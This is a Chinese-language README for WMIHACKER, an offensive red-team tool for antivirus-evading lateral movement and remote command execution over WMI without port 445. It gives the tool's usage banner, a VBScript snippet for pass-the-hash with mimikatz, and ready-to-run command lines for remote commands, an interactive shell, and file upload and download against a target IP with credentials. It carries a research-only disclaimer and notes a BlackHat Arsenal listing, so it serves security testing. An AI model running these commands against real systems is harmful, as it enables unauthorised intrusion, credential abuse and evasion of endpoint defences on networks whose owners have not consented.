# WMIHACKER(无需445端口)
> 免责声明：本项目涉及的技术仅供安全学习与研究防御用途，禁止非法使用！

免杀横向移动命令执行测试工具(无需445端口)

介绍：免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横向移动测试工具。(无需445端口)

主要功能：1、命令执行；2、文件上传；3、文件下载；4、PTH使用

## 使用
合并[Issue 1](https://github.com/360-Linton-Lab/WMIHACKER/issues/1)里PTH的使用方法：

```vbscript
第54-58行代码：

if user = "-" And pass = "-" Then
set objWMIService = objLocator.connectserver(host,"root/cimv2")
Set SubobjSWbemServices = objLocator.ConnectServer(host, "root\subscription")
Set regWMIService = objLocator.ConnectServer(host, "root\default")

用户名和密码填“-”，结合mimikatz的PTH就可以进行WMI的PTH了。
```

```
C:\Users\administrator\Desktop>cscript //nologo WMIHACKER_0.6.vbs

__          ____  __ _____   _    _          _____ _  ________ _____
\ \        / /  \/  |_   _| | |  | |   /\   / ____| |/ /  ____|  __ \
 \ \  /\  / /| \  / | | |   | |__| |  /  \ | |    | ' /| |__  | |__) |
  \ \/  \/ / | |\/| | | |   |  __  | / /\ \| |    |  < |  __| |  _  /
   \  /\  /  | |  | |_| |_  | |  | |/ ____ \ |____| . \| |____| | \ \
    \/  \/   |_|  |_|_____| |_|  |_/_/    \_\_____|_|\_\______|_|  \_\
                              v0.6beta       By. Xiangshan@360RedTeam
Usage:
        WMIHACKER.vbs  /cmd  host  user  pass  command GETRES?

        WMIHACKER.vbs  /shell  host  user  pass

        WMIHACKER.vbs  /upload  host  user  pass  localpath remotepath

        WMIHACKER.vbs  /download  host  user  pass  localpath remotepath

          /cmd          single command mode
          host          hostname or IP address
          GETRES?       Res Need Or Not, Use 1 Or 0
          command       the command to run on remote host
```

有命令回显执行方式

`> cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 1`

无命令回显

`> cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo > c:\1.txt" 0`

模拟shell模式

`> cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator "Password!" `

文件上传-复制本机calc.exe到远程主机c:\calc.exe

`> cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator "Password!" "c:\windows\system32\calc.exe" "c:\calc"`

文件下载-下载远程主机calc.exe到本地c:\calc.exe

`> cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator "Password!" "c:\calc" "c:\windows\system32\calc.exe" `

## 404星链计划
<img src="https://github.com/knownsec/404StarLink-Project/raw/master/logo.png" width="30%">

WMIHACKER 现已加入 [404星链计划](https://github.com/knownsec/404StarLink)

## BlackHat Asia 2020 Arsenal

[https://www.blackhat.com/asia-20/arsenal/schedule/#wmihacker-a-new-way-to-use-135-port-lateral-movement-bypass-av-and-transfer-file-18995](https://www.blackhat.com/asia-20/arsenal/schedule/#wmihacker-a-new-way-to-use-135-port-lateral-movement-bypass-av-and-transfer-file-18995)

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=rootclay/WMIHACKER&type=Date)](https://star-history.com/#rootclay/WMIHACKER&Date)

